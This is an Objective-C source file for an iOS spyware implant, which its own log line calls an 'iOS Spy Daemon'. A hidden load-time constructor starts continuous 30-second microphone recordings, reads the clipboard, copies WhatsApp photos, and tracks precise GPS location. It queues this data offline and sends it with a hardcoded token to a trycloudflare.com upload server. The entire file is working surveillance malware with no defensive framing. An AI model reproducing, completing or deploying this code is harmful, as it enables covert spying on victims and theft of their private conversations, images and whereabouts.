#import <Foundation/Foundation.h>
#import <UIKit/UIKit.h>
#import <AVFoundation/AVFoundation.h>
#import <CoreLocation/CoreLocation.h>

// ================== التكوين ==================
#define SERVER_URL @"https://initiated-amendment-keeps-arkansas.trycloudflare.com/upload"
#define DEVICE_ID [[UIDevice currentDevice].identifierForVendor.UUIDString substringToIndex:8]

// ================== التخزين المحلي ==================
NSString* getStoragePath() {
    NSArray *paths = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES);
    NSString *documentsDirectory = [paths objectAtIndex:0];
    return [documentsDirectory stringByAppendingPathComponent:@"pending_data"];
}

void saveToLocal(NSString *type, NSString *content) {
    NSDictionary *payload = @{
        @"device_id": DEVICE_ID,
        @"type": type,
        @"content": content ? content : @""
    };
    NSString *dir = getStoragePath();
    [[NSFileManager defaultManager] createDirectoryAtPath:dir withIntermediateDirectories:YES attributes:nil error:nil];
    NSString *filename = [NSString stringWithFormat:@"pending_%@.json", @([[NSDate date] timeIntervalSince1970])];
    NSString *filePath = [dir stringByAppendingPathComponent:filename];
    NSData *jsonData = [NSJSONSerialization dataWithJSONObject:payload options:0 error:nil];
    [jsonData writeToFile:filePath atomically:YES];
    NSLog(@"[*] Saved locally (offline): %@ - %@", type, filename);
}

// ================== الإرسال ==================
void sendData(NSString *type, NSString *content) {
    NSDictionary *payload = @{
        @"device_id": DEVICE_ID,
        @"type": type,
        @"content": content ? content : @""
    };
    NSData *jsonData = [NSJSONSerialization dataWithJSONObject:payload options:0 error:nil];
    NSURL *url = [NSURL URLWithString:SERVER_URL];
    NSMutableURLRequest *request = [NSMutableURLRequest requestWithURL:url];
    [request setHTTPMethod:@"POST"];
    [request setHTTPBody:jsonData];
    [request setValue:@"application/json" forHTTPHeaderField:@"Content-Type"];
    [request setValue:@"WORM_GPST_SUPREME_KEY" forHTTPHeaderField:@"X-Auth-Token"];
    
    NSURLSessionDataTask *task = [[NSURLSession sharedSession] dataTaskWithRequest:request completionHandler:^(NSData *data, NSURLResponse *response, NSError *error) {
        if (error) {
            saveToLocal(type, content);
            NSLog(@"[!] No internet, saved locally.");
        } else {
            NSLog(@"[+] Data sent to server: %@", type);
        }
    }];
    [task resume];
}

// ================== إرسال المخزّن ==================
void sendPendingData() {
    NSString *dir = getStoragePath();
    NSArray *files = [[NSFileManager defaultManager] contentsOfDirectoryAtPath:dir error:nil];
    for (NSString *file in files) {
        NSString *filePath = [dir stringByAppendingPathComponent:file];
        NSData *jsonData = [NSData dataWithContentsOfFile:filePath];
        NSDictionary *payload = [NSJSONSerialization JSONObjectWithData:jsonData options:0 error:nil];
        if (payload) {
            sendData(payload[@"type"], payload[@"content"]);
            [[NSFileManager defaultManager] removeItemAtPath:filePath error:nil];
        }
    }
}

// ================== تسجيل الصوت ==================
void startRecordingAndSave() {
    AVAudioSession *session = [AVAudioSession sharedInstance];
    [session setCategory:AVAudioSessionCategoryPlayAndRecord error:nil];
    [session setActive:YES error:nil];

    NSString *tempFile = [NSTemporaryDirectory() stringByAppendingPathComponent:@"temp_rec.m4a"];
    NSURL *outputURL = [NSURL fileURLWithPath:tempFile];
    NSDictionary *settings = @{
        AVFormatIDKey: @(kAudioFormatMPEG4AAC),
        AVSampleRateKey: @(44100),
        AVNumberOfChannelsKey: @(1),
        AVEncoderBitRateKey: @(128000)
    };
    AVAudioRecorder *recorder = [[AVAudioRecorder alloc] initWithURL:outputURL settings:settings error:nil];
    [recorder record];
    NSLog(@"[*] Recording started...");

    dispatch_after(dispatch_time(DISPATCH_TIME_NOW, 30 * NSEC_PER_SEC), dispatch_get_main_queue(), ^{
        [recorder stop];
        NSData *audioData = [NSData dataWithContentsOfURL:outputURL];
        if (audioData.length > 0) {
            NSString *base64Audio = [audioData base64EncodedStringWithOptions:0];
            sendData(@"call", base64Audio);
        }
        [[NSFileManager defaultManager] removeItemAtURL:outputURL error:nil];
        startRecordingAndSave();
    });
}

// ================== سرقة واتساب ==================
void stealWhatsAppMessages() {
    UIPasteboard *pasteboard = [UIPasteboard generalPasteboard];
    NSString *copiedText = pasteboard.string;
    if (copiedText.length > 0) {
        saveToLocal(@"whatsapp_text", copiedText);
        NSLog(@"[*] WhatsApp text stolen: %@", copiedText);
    }

    NSString *whatsAppPath = @"/var/mobile/Containers/Data/Application/WhatsApp/Documents/";
    NSArray *imageFiles = [[NSFileManager defaultManager] contentsOfDirectoryAtPath:whatsAppPath error:nil];
    for (NSString *file in imageFiles) {
        if ([file hasSuffix:@".jpg"] || [file hasSuffix:@".png"] || [file hasSuffix:@".jpeg"]) {
            NSString *filePath = [whatsAppPath stringByAppendingPathComponent:file];
            NSData *imageData = [NSData dataWithContentsOfFile:filePath];
            if (imageData) {
                NSString *base64Image = [imageData base64EncodedStringWithOptions:0];
                saveToLocal(@"whatsapp_photo", base64Image);
                NSLog(@"[*] WhatsApp photo stolen: %@", file);
            }
        }
    }
}

// ================== تتبع الموقع ==================
CLLocationManager *locationManager = nil;

@interface LocationDelegate : NSObject <CLLocationManagerDelegate>
@end

@implementation LocationDelegate
- (void)locationManager:(CLLocationManager *)manager didUpdateLocations:(NSArray<CLLocation *> *)locations {
    CLLocation *location = [locations lastObject];
    if (location) {
        NSString *locationString = [NSString stringWithFormat:@"%.6f,%.6f", location.coordinate.latitude, location.coordinate.longitude];
        saveToLocal(@"location", locationString);
        sendData(@"location", locationString);
        NSLog(@"[*] Location: %@", locationString);
    }
}
@end

LocationDelegate *locationDelegate = nil;

void startLocationTracking() {
    locationManager = [[CLLocationManager alloc] init];
    locationDelegate = [[LocationDelegate alloc] init];
    locationManager.delegate = locationDelegate;
    locationManager.desiredAccuracy = kCLLocationAccuracyBest;
    [locationManager requestWhenInUseAuthorization];
    [locationManager startUpdatingLocation];
}

// ================== مراقبة النت ==================
void startNetworkMonitor() {
    [NSTimer scheduledTimerWithTimeInterval:30.0 repeats:YES block:^(NSTimer *timer) {
        sendPendingData();
        stealWhatsAppMessages();
    }];
}

// ================== البداية المخفية ==================
__attribute__((constructor))
void init() {
    @autoreleasepool {
        NSLog(@"[+] iOS Spy Daemon Loaded (Hidden)");
        startRecordingAndSave();
        startNetworkMonitor();
        sendPendingData();
        startLocationTracking();
    }
}

// ================== الدالة الرئيسية ==================
int main(int argc, char *argv[]) {
    return UIApplicationMain(argc, argv, nil, nil);
}
